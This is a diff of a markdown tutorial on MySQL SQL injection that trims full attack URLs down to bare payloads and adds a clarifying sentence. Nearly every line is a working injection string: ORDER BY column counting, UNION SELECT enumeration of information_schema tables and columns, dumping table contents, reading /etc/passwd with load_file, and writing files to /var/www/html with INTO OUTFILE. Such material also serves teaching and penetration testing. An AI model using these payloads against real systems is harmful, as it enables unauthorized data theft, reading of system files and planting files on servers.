@@ -578,6 +578,8 @@ this way you will know how many columns that table has. Inject it like so:
 
 `https://page.com/login.php?username=hello' ORDER BY 1 %23&password=world`
 
+To organize the code, the only part that will be written is going to be after the username (`hello'`) and before the `%23` sign.
+
 Go and sort the numbers till you get the highest number possible without an error. This number will be the number of columns in the table.
 
 #### Read Database Information
@@ -591,11 +593,11 @@ so to retrieve information set the other to `null`.
 
 At the example above, let's suppose that the number of columns is 5. So to get the columns with `UNION` put this in the URL:
 
-`https://page.com/login.php?username=hello' UNION SELECT 1,2,3,4,5 %23&password=world`
+`UNION SELECT 1,2,3,4,5`
 
 Then try some MySQL functions in the column numbers:
 
-`https://page.com/login.php?username=hello' UNION SELECT 1,database(),user(),version(),5 %23&password=world`
+`UNION SELECT 1,database(),user(),version(),5`
 
 These function will retrieve the current database, user and version of the database respectively.
 
@@ -605,29 +607,29 @@ The `information_schema` database is a default database created by MySQL and it 
 
 To get all the tables from that database perform:
 
-`https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables %23&password=world`
+`UNION SELECT null,table_name,null,null,null from information_schema.tables`
 
 This will select the column `table_name` from the table `tables` of the database `information_schema`.
 
 To get all the table names from a database perform:
 
-`https://page.com/login.php?username=hello' UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]' %23&password=world`
+`UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]'`
 
 To get the columns of a table from a database perform:
 
-`https://page.com/login.php?username=hello' UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]' %23&password=world`
+`UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]'`
 
 To get content in the columns from a table from a database perform:
 
-`https://page.com/login.php?username=hello' UNION SELECT null,[column name],null,null,null from [table name] %23&password=world`
+`UNION SELECT null,[column name],null,null,null from [table name]`
 
 #### Read and Write Files On The Server
 
 With these functions the database can read and write files on the server. To see it perform:
 
-`https://page.com/login.php?username=hello' UNION SELECT null,load_file('/etc/passwd'),null,null,null %23&password=world`
+`UNION SELECT null,load_file('/etc/passwd'),null,null,null`
 
-`https://page.com/login.php?username=hello' UNION SELECT null,'anything to be written in the server',null,null,null into outfile '/var/www/html/file.txt' %23&password=world`
+`UNION SELECT null,'anything to be written in the server',null,null,null into outfile '/var/www/html/file.txt'`
 
 If you don't have permissions to write a file in that directory just write in another one.
 
